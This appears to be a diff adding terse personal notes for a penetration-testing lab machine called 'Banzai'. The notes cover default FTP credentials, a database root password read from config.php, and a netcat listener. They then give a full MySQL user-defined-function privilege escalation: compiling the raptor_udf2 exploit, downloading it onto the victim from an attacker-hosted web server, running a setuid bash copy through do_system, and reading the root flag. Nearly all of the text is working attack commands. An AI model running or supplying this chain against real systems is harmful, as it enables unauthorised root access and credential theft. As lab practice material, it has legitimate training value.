@@ -1,0 +1,48 @@
+Banzai
+
+enumeration port 21
+default username and password admin:admin
+
+port 8295 running http
+sudo nc -nvlp 21
+
+cd /var/www
+
+cat config.php
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'EscalateRaftHubris123');
+define('DBNAME', 'main');
+?>
+
+mysql -u root -h localhost -pEscalateRaftHubris123
+
+On Kali
+searchsploit mysql | grep local
+searchsploit -m  -m linux/local/1518.c
+
+https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/
+gcc -g -c 1518.c -o raptor_udf2.o -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+python -m http.server 8295
+
+On Victim shell
+
+wget http://192.168.49.51:8295/raptor_udf2.so
+mysql -u root -p
+EscalateRaftHubris123
+
+
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/var/www/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /var/www/pv; chmod +xs /var/www/pv');
+
+exit
+/var/www/pv -p
+cat /root/proof.txt
+
